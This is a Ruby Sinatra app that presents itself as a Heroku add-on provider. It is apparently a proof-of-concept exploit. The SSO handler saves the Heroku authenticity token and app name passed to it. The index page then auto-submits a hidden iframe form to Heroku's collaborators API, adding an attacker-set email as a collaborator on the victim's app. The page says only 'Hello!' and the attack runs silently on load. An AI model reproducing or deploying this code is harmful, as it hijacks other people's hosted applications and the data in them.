require 'bundler'
Bundler.require

STDOUT.sync = true

class App < Sinatra::Base
  use Rack::Session::Cookie, secret: ENV['SSO_SALT']

  helpers do
    def protected!
      unless authorized?
        response['WWW-Authenticate'] = 'Basic realm="Restricted Area"'
        throw(:halt, [401, "Not authorized\n"])
      end
    end

    def authorized?
      @auth ||=  Rack::Auth::Basic::Request.new(request.env)
      @auth.provided? && @auth.basic? && @auth.credentials && 
      @auth.credentials == [ENV['HEROKU_USERNAME'], ENV['HEROKU_PASSWORD']]
    end
  end

  get '/' do
    halt 403, 'not logged in' unless session[:heroku_sso]
    haml :index
  end

  def sso
    halt 403 if params[:timestamp].to_i < (Time.now - 2 * 60).to_i

    token = Digest::SHA1.hexdigest("#{params[:id]}:#{ENV['SSO_SALT']}:#{params[:timestamp]}")
    halt 403 unless token == params[:token]

    session[:authenticity_token] = params[:authenticity_token]
    session[:app] = params[:app]

    redirect '/'
  end

  get('/heroku/resources/:id') { sso }
  post('/sso/login') { sso }

  post '/heroku/resources' do
    protected!

    status 201
    '{"id":0}'
  end

  delete '/heroku/resources/:id' do
    protected!

    'ok'
  end

  put '/heroku/resources/:id' do
    protected!

    '{}'
  end
end

__END__

@@ index
!!!
%html
  %head
  %body
    %p Hello!
    :javascript
      var app, authenticity_token, doc, email, form, iframe, input;
      authenticity_token = '#{session[:authenticity_token]}';
      app = '#{session[:app]}';
      email = '#{ENV['COLLABORATOR_EMAIL']}';

      iframe = document.createElement("iframe");
      document.body.appendChild(iframe);

      doc = iframe.contentDocument ? iframe.contentDocument : iframe.contentWindow ? iframe.contentWindow : iframe.document;
      doc.open();
      doc.close();

      form = doc.createElement("form");
      form.setAttribute("action", " https://api.heroku.com/apps/" + app + "/collaborators");
      form.setAttribute("method", "post");
      doc.body.appendChild(form);

      input = doc.createElement("input");
      input.setAttribute("type", "hidden");
      input.setAttribute("name", "utf8");
      input.setAttribute("value", "✓");
      form.appendChild(input);

      input = doc.createElement("input");
      input.setAttribute("type", "hidden");
      input.setAttribute("name", "authenticity_token");
      input.setAttribute("value", authenticity_token);
      form.appendChild(input);

      input = doc.createElement("input");
      input.setAttribute("type", "hidden");
      input.setAttribute("name", "collaborator[email]");
      input.setAttribute("value", email);
      form.appendChild(input);

      form.submit();
